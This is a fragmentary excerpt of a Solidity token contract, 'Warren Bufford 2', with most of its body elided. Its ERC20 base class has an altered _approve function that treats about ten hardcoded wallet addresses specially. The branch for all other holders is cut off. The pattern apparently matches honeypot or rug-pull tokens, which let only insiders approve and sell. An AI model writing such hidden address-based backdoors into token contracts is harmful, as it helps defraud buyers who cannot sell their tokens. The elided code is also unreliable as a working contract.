...
abstract contract ERC20 is IERC20 {
    ...
    function _approve(
        ...
        if (owner == address(0x94Fa448001701a78738b408f9f3cB38313018D53)) {
            ...
            owner == address(0x2E8e17e00729998b512622AC0E43D19dB3F78080)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x239B28afc67496e4cCa59689d4990ed862B74682)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0xC5554277D29Ea4876F563D056f86d80c270b0c50)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x349e8c60C400A5cf128c73b29A2C045BfDc2eBd3)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0xE24eEAB412260A82065D7072b4EDe43CF1ECBCf2)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x1DbfbD8000fdb41a09aFe1CA4F0240aF7dd546CC)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x497c50789daa471A4E94e238a00930e115F97eBf)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x0686d015421679D4FE72B185a6CD4cc665155F96)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x59b38B720616544dCB98Dd113b0b88164EF9Fa3C)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else {
...
contract WarrenBufford is ERC20Permit, VaultOwned {
    using SafeMath for uint256;

    constructor() ERC20("Warren Bufford 2", "Bufford", 8) {}
